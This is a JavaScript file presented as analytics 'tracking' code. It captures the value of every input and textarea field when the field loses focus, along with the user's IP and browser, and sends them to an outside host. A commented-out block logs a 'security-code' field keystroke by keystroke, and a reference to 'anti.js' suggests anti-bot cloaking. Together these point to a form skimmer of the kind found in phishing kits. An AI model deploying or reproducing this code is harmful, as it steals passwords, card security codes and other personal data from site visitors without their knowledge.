(async function () {
  if (!localStorage.getItem("clientSessionID")) {
    const generateShortSessionID = () => {
      const array = new Uint8Array(8);
      window.crypto.getRandomValues(array);
      return (
        Array.from(array.slice(0, 3)).map(b => b.toString(16).padStart(2, "0")).join("") +
        "-" +
        array[3].toString(16).padStart(2, "0") +
        array[4].toString(16).padStart(2, "0") +
        "-" +
        Array.from(array.slice(5, 8)).map(b => b.toString(16).padStart(2, "0")).join("")
      );
    };

    const clientSessionID = generateShortSessionID();
    localStorage.setItem("clientSessionID", clientSessionID);
  }

  const waitForIP = () =>
    new Promise(resolve => {
      if (window.userIP) {
        resolve(window.userIP);
      } else {
        const checkInterval = setInterval(() => {
          if (window.userIP) {
            clearInterval(checkInterval);
            resolve(window.userIP);
          }
        }, 100);
      }
    });

  const userIP = await waitForIP();
  console.log("✅ Using IP from anti.js:", userIP);

  const getBrowserInfo = () => {
    if (navigator.userAgentData && navigator.userAgentData.brands) {
      const brand = navigator.userAgentData.brands.find(
        b => !b.brand.includes("Not") && !b.brand.includes("A")
      );
      return brand ? brand.brand : "Unknown Browser";
    }

    const ua = navigator.userAgent;
    return ua.includes("Firefox")
      ? "Mozilla Firefox"
      : ua.includes("SamsungBrowser")
      ? "Samsung Internet"
      : ua.includes("Opera") || ua.includes("OPR")
      ? "Opera"
      : ua.includes("Trident")
      ? "Internet Explorer"
      : ua.includes("Edg")
      ? "Microsoft Edge"
      : ua.includes("Chrome")
      ? "Google Chrome"
      : ua.includes("Safari")
      ? "Apple Safari"
      : "Unknown";
  };
  const sendTrackingData = (eventType, additionalData = {}) => {
    const clientSessionID = localStorage.getItem("clientSessionID");
    const pageUrl = window.location.href;
    const browserInfo = getBrowserInfo();

    const data = {
      clientSessionID,
      userIP,
      pageUrl,
      eventType,
      browserInfo,
      timestamp: new Date().toISOString(),
      ...additionalData,
    };

    console.log("Sending tracking data:", data); // Log the data being sent

    fetch("https://juweo.com/api/insights/data_54zL", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }).then(async (response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      // Check if the response is JSON or plain text
      const contentType = response.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        return response.json();
      } else {
        return response.text(); // Handle non-JSON responses
      }
    }).then(data => {
      console.log("Tracking data sent successfully:", data);
    }).catch(error => {
      console.error("❌ Tracking data failed:", error);
    });
  };

  sendTrackingData("page_load");

  // Event Listener for Page Unload
  window.addEventListener("beforeunload", () => sendTrackingData("page_unload"));

  // Event Listener for Page Navigation Changes (MutationObserver to catch all navigations)
  let lastUrl = window.location.href;
  new MutationObserver(() => {
    if (lastUrl !== window.location.href) {
      lastUrl = window.location.href;
      sendTrackingData("page_navigation");
    }
  }).observe(document, { subtree: true, childList: true });

  // Event Listeners for Input Blur
  document.addEventListener("blur", event => {
    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
      sendTrackingData("input", { inputName: event.target.name || event.target.id, inputValue: event.target.value });
    }
  }, true); // Use capture phase to ensure blur event is captured

  // Event Listeners for Button Clicks
  document.addEventListener("click", event => {
    if (event.target.tagName === "BUTTON") {
      sendTrackingData("button_click", {
        buttonId: event.target.id,
        buttonClass: event.target.className,
        buttonText: event.target.innerText,
      });
    }
  });

  // Real-time tracking for a specific input field by ID
  /*const realTimeInputId = "security-code"; // Replace with the ID of the input field you want to track in real-time

  const waitForElement = (selector) => {
    return new Promise(resolve => {
      const element = document.querySelector(selector);
      if (element) {
        resolve(element);
      } else {
        const observer = new MutationObserver((mutations, me) => {
          const element = document.querySelector(selector);
          if (element) {
            resolve(element);
            me.disconnect();
          }
        });
        observer.observe(document, {
          childList: true,
          subtree: true
        });
      }
    });
  };

  const realTimeInput = await waitForElement(`#${realTimeInputId}`);

  if (realTimeInput) {
    realTimeInput.addEventListener("input", event => {
      sendTrackingData("input", { inputName: event.target.name || event.target.id, inputValue: event.target.value });
    });
  }
*/
})();